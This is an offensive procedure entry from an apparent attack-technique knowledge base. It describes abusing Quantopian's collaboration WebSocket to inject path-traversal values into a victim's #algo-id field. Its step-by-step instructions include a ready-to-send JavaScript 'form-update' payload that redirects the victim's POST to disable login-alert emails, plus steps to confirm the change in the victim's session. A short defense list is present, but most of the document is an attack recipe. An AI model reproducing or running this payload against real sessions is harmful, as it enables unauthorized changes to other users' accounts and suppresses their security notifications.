---
id: proc-837328-websocket-manipulation
tags:
  - websocket
  - path-traversal
  - dom-manipulation
type: procedure
tools: []
tactics:
  - '[[Defense Evasion]]'
commands:
  - '[[commands/websocket-form-update-basic]]'
  - '[[commands/websocket-form-update-preferences]]'
  - '[[commands/websocket-form-update-profile]]'
  - '[[commands/websocket-form-update-message]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:29:28.008Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Send-Malicious-WebSocket-Form-Update

## Summary

This procedure injects crafted 'form-update' WebSocket messages into a Quantopian collaboration session to arbitrarily set the value of the #algo-id HTML element, enabling path traversal payloads that redirect subsequent POST requests to unintended endpoints.

## Description

The WebSocket library in Quantopian's collaboration feature lacks validation, allowing any connected client to update form elements across all browsers in the room. By targeting #algo-id, the attacker sets it to a traversal string like '/../../../../../users/update_preferences?params', which the 'Build Algorithm' button uses unsanitized. This works in browser environments during active sessions and can chain to various impacts like account changes or spam.

## Requirements

1. Active shared WebSocket room with victim connected
2. Knowledge of target endpoints (e.g., /users/update_preferences)
3. Browser DevTools or WebSocket client for payload sending

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all WebSocket payloads, restricting updates to authenticated senders
- Implement path normalization and allowlisting for dynamic URLs in client-side code
- Log and alert on suspicious element updates in collaboration sessions

## Objectives

1. Update #algo-id with path traversal payload in victim's browser
2. Ensure sync without triggering client-side errors
3. Enable redirection of victim's POST requests to attacker-chosen endpoints

## Instructions

### Step 1: Prepare WebSocket Connection

**Context**: Connect to the collaboration room's WebSocket endpoint.

Open browser DevTools, navigate to Network > WS, or use a client to connect to wss://quantopian.com/ws/room/{roomId}.

### Step 2: Send Payload Using Command

**Context**: Broadcast the form-update event to manipulate #algo-id.

Execute [[commands/websocket-form-update-preferences]] for disabling notifications:

```javascript
// Via browser console
const payload = {
  type: 'form-update',
  element: '#algo-id',
  value: '/../../../../../users/update_preferences?prefs%5Bsend_login_detected_email%5D=false',
  clientId: 'x',
  roomId: '5ce6e50b298f7c6e0acb68c6'
};
ws.send(JSON.stringify(payload));
```

> This updates the element value across all clients; verify in victim's session.

For profile changes, use [[commands/websocket-form-update-profile]] similarly.

**Expected Output**: #algo-id value changed to payload; no errors in console.

### Step 3: Verify Manipulation

**Context**: Confirm the update propagated to victim.

Monitor shared session or ask victim indirectly; check DevTools for element value.

**Expected Output**: Victim's #algo-id reflects the traversal string.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion]] Defense Evasion

### Techniques

- [[JavaScript]] JavaScript
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

-

## Commands Used

- [[commands/websocket-form-update-basic]]
- [[commands/websocket-form-update-preferences]]
- [[commands/websocket-form-update-profile]]
- [[commands/websocket-form-update-message]]

## Tools Used

-

## Tags

- [[websocket]]
- [[path-traversal]]
- [[dom-manipulation]]
